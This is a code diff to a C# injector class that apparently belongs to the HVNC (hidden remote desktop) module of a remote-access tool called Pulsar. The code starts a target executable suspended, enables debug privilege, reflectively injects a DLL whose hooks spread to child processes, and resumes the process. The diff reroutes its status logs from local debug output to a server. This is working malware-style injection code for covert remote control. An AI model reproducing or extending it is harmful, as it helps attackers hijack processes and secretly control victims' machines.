@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Pulsar.Client.LoggingAPI;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -24,52 +25,52 @@ namespace Pulsar.Client.Helper.HVNC
             {
                 if (dllBytes == null || dllBytes.Length == 0)
                 {
-                    Debug.WriteLine("[-] Invalid DLL bytes provided");
+                    UniversalDebugLogger.SendLogToServer("[-] Invalid DLL bytes provided");
                     return 0;
                 }
 
                 if (string.IsNullOrWhiteSpace(exePath))
                 {
-                    Debug.WriteLine("[-] No target executable specified");
+                    UniversalDebugLogger.SendLogToServer("[-] No target executable specified");
                     return 0;
                 }
 
                 if (string.IsNullOrWhiteSpace(searchPattern) || string.IsNullOrWhiteSpace(replacementPath))
                 {
-                    Debug.WriteLine("[-] Search pattern and replacement path are required");
+                    UniversalDebugLogger.SendLogToServer("[-] Search pattern and replacement path are required");
                     return 0;
                 }
 
-                Debug.WriteLine($"[*] Starting reflective DLL injection");
-                Debug.WriteLine($"    Target: {exePath}");
-                Debug.WriteLine($"    Search Pattern: {searchPattern}");
-                Debug.WriteLine($"    Replacement Path: {replacementPath}");
-                Debug.WriteLine($"    DLL Size: {dllBytes.Length} bytes");
+                UniversalDebugLogger.SendLogToServer($"[*] Starting reflective DLL injection");
+                UniversalDebugLogger.SendLogToServer($"    Target: {exePath}");
+                UniversalDebugLogger.SendLogToServer($"    Search Pattern: {searchPattern}");
+                UniversalDebugLogger.SendLogToServer($"    Replacement Path: {replacementPath}");
+                UniversalDebugLogger.SendLogToServer($"    DLL Size: {dllBytes.Length} bytes");
 
                 PrivilegeManager.EnableDebugPrivilege();
 
                 var (process, hProcess, hThread) = ProcessManager.StartProcessSuspended(exePath, searchPattern, replacementPath);
                 if (process == null || hProcess == IntPtr.Zero || hThread == IntPtr.Zero)
                 {
-                    Debug.WriteLine("[-] Failed to create suspended process");
+                    UniversalDebugLogger.SendLogToServer("[-] Failed to create suspended process");
                     return 0;
                 }
 
                 int processId = process.Id;
-                Debug.WriteLine($"[+] Started process '{Path.GetFileName(exePath)}' (suspended) with PID {processId}");
+                UniversalDebugLogger.SendLogToServer($"[+] Started process '{Path.GetFileName(exePath)}' (suspended) with PID {processId}");
 
                 try
                 {
                     bool success = Injector.InjectDllWithHandle(hProcess, dllBytes);
                     if (success)
                     {
-                        Debug.WriteLine($"[+] Successfully injected '{Path.GetFileName(exePath)}' into process {processId}");
-                        Debug.WriteLine($"[+] Search pattern: {searchPattern}");
-                        Debug.WriteLine($"[+] Replacement path: {replacementPath}");
+                        UniversalDebugLogger.SendLogToServer($"[+] Successfully injected '{Path.GetFileName(exePath)}' into process {processId}");
+                        UniversalDebugLogger.SendLogToServer($"[+] Search pattern: {searchPattern}");
+                        UniversalDebugLogger.SendLogToServer($"[+] Replacement path: {replacementPath}");
                     }
                     else
                     {
-                        Debug.WriteLine("[-] Injection failed");
+                        UniversalDebugLogger.SendLogToServer("[-] Injection failed");
                         Injector.CloseHandle(hProcess);
                         Injector.CloseHandle(hThread);
                         if (!process.HasExited)
@@ -84,16 +85,16 @@ namespace Pulsar.Client.Helper.HVNC
                     Injector.CloseHandle(hProcess);
                 }
 
-                Debug.WriteLine("[+] Resuming main thread...");
+                UniversalDebugLogger.SendLogToServer("[+] Resuming main thread...");
                 ProcessManager.ResumeThreadExP(hThread);
                 Injector.CloseHandle(hThread);
 
-                Debug.WriteLine("[+] Process running. DLL hooks will propagate to child processes.");
+                UniversalDebugLogger.SendLogToServer("[+] Process running. DLL hooks will propagate to child processes.");
                 return processId;
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"[-] Exception in KDOTInjector.Start: {ex.Message}");
+                UniversalDebugLogger.SendLogToServer($"[-] Exception in KDOTInjector.Start: {ex.Message}");
                 return 0;
             }
         }
